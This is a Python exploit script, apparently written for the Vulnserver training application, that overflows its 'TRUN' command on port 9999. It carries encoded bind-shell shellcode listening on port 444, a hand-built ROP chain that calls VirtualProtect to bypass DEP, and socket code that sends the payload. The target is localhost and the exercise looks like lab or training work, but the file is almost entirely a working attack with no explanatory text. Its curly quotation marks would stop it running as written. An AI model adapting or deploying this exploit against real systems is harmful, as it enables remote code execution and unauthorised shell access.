import socket, sys
from struct import pack
# tcp/ip bind 444 shellcode
buf = “\x2b\xc9\x83\xe9\xb5\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\x25\xab\x3a\xc9\x83\xee\xfc\xe2\xf4\xd9\x43\xb3\xc9\x25\xab\x5a\x40\xc0\x9a\xe8\xad\xae\xf9\x0a\x42\x77\xa7\xb1\x9b\x31\x20\x48\xe1\x2a\x1c\x70\xef\x14\x54\x0b\x09\x89\x97\x5b\xb5\x27\x87\x1a\x08\xea\xa6\x3b\x0e\xc7\x5b\x68\x9e\xae\xf9\x2a\x42\x67\x97\x3b\x19\xae\xeb\x42\x4c\xe5\xdf\x70\xc8\xf5\xfb\xb1\x81\x3d\x20\x62\xe9\x24\x78\xd9\xf5\x6c\x20\x0e\x42\x24\x7d\x0b\x36\x14\x6b\x96\x08\xea\xa6\x3b\x0e\x1d\x4b\x4f\x3d\x26\xd6\xc2\xf2\x58\x8f\x4f\x2b\x7d\x20\x62\xed\x24\x78\x5c\x42\x29\xe0\xb1\x91\x39\xaa\xe9\x42\x21\x20\x3b\x19\xac\xef\x1e\xed\x7e\xf0\x5b\x90\x7f\xfa\xc5\x29\x7d\xf4\x60\x42\x37\x40\xbc\x94\x4d\x98\x08\xc9\x25\xc3\x4d\xba\x17\xf4\x6e\xa1\x69\xdc\x1c\xce\xda\x7e\x82\x59\x24\xab\x3a\xe0\xe1\xff\x6a\xa1\x0c\x2b\x51\xc9\xda\x7e\x6a\x99\x75\xfb\x7a\x99\x65\xfb\x52\x23\x2a\x74\xda\x36\xf0\x3c\x0b\x12\x76\xc3\x38\xc9\x34\xf7\xb3\x2f\x4f\xbb\x6c\x9e\x4d\x69\xe1\xfe\x42\x54\xef\x9a\x72\xc3\x8d\x20\x1d\x54\xc5\x1c\x76\xf8\x6d\xa1\x51\x47\x01\x28\xda\x7e\x6d\x5e\x4d\xde\x54\x84\x44\x54\xef\xa3\x25\xc1\x3e\x9f\x72\xc3\x38\x10\xed\xf4\xc5\x1c\xae\x9d\x50\x89\x4d\xab\x2a\xc9\x25\xfd\x50\xc9\x4d\xf3\x9e\x9a\xc0\x54\xef\x5a\x76\xc1\x3a\x9f\x76\xfc\x52\xcb\xfc\x63\x65\x36\xf0\xaa\xf9\xe0\xe3\x2e\xcc\xbc\xc9\x68\x3a\xc9”
target = “127.0.0.1”
port = int(“9999”)
from operator import *
address_loc = xor(0x00B6FAD0 , 0xffffffff)
address_val = xor(0x00B6FAE0, 0xffffffff)
size_loc = xor(0x00B6FAD4, 0xffffffff)
size = xor(len(buf), 0xffffffff)
nprotect_loc = xor(0x00B6FAD8, 0xffffffff)
nprotect = xor(0x40, 0xffffffff)
oldprotect_loc = xor(0x00B6FADC, 0xffffffff)
oldprotect = xor(0x00B6FAB4, 0xffffffff)
# first param
eip = pack(‘<L’, 0x7C9029AC) # pop edi
eip += pack(‘<L’, 0xffffffff)
eip += pack(‘<L’, 0x7C971980)    #pop ecx
eip += pack(‘<L’, address_loc)
eip += pack(‘<L’, 0x71AB100C)    #xor ecx, edi
eip += pack(‘<L’, 0x77C14001) # xchg eax, ecx
eip += pack(‘<L’, 0x7C9029AC) # pop edi
eip += pack(‘<L’, 0xffffffff)
eip += pack(‘<L’, 0x7C971980)    #pop ecx
eip += pack(‘<L’, address_val)
eip += pack(‘<L’, 0x71AB100C)    #xor ecx, edi
eip += pack(‘<L’, 0x7C951376) # MOV DWORD PTR DS:[EAX],ECX
# second param
eip += pack(‘<L’, 0x7C9029AC) # pop edi
eip += pack(‘<L’, 0xffffffff)
eip += pack(‘<L’, 0x7C971980)    #pop ecx
eip += pack(‘<L’, size_loc)
eip += pack(‘<L’, 0x71AB100C)    #xor ecx, edi
eip += pack(‘<L’, 0x77C14001) # xchg eax, ecx
eip += pack(‘<L’, 0x7C9029AC) # pop edi
eip += pack(‘<L’, 0xffffffff)
eip += pack(‘<L’, 0x7C971980)    #pop ecx
eip += pack(‘<L’, size)
eip += pack(‘<L’, 0x71AB100C)    #xor ecx, edi
eip += pack(‘<L’, 0x7C951376) # MOV DWORD PTR DS:[EAX],ECX
# Third param
eip += pack(‘<L’, 0x7C9029AC) # pop edi
eip += pack(‘<L’, 0xffffffff)
eip += pack(‘<L’, 0x7C971980)    #pop ecx
eip += pack(‘<L’, nprotect_loc)
eip += pack(‘<L’, 0x71AB100C)    #xor ecx, edi
eip += pack(‘<L’, 0x77C14001) # xchg eax, ecx
eip += pack(‘<L’, 0x7C9029AC) # pop edi
eip += pack(‘<L’, 0xffffffff)
eip += pack(‘<L’, 0x7C971980)    #pop ecx
eip += pack(‘<L’, nprotect)
eip += pack(‘<L’, 0x71AB100C)    #xor ecx, edi
eip += pack(‘<L’, 0x7C951376) # MOV DWORD PTR DS:[EAX],ECX
# fourth param
eip += pack(‘<L’, 0x7C9029AC) # pop edi
eip += pack(‘<L’, 0xffffffff)
eip += pack(‘<L’, 0x7C971980)    #pop ecx
eip += pack(‘<L’, oldprotect_loc)
eip += pack(‘<L’, 0x71AB100C)    #xor ecx, edi
eip += pack(‘<L’, 0x77C14001) # xchg eax, ecx
eip += pack(‘<L’, 0x7C9029AC) # pop edi
eip += pack(‘<L’, 0xffffffff)
eip += pack(‘<L’, 0x7C971980)    #pop ecx
eip += pack(‘<L’, oldprotect)
eip += pack(‘<L’, 0x71AB100C)    #xor ecx, edi
eip += pack(‘<L’, 0x7C951376) # MOV DWORD PTR DS:[EAX],ECX
eip += pack(‘<L’, 0x7C801AD0 ) # VirtualProtect
eip += pack(‘<L’, 0x7C941EED) # JMP ESP
eip += pack(‘<L’, 0xdeadbeef) #1
eip += pack(‘<L’, 0xdeadbeef) #2
eip += pack(‘<L’, 0xdeadbeef) #3
eip += pack(‘<L’, 0xdeadbeef) #4
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target,port))
s.send(“TRUN .” + “a” * 2006 + eip + buf)
s.recv(1000)
s.close()
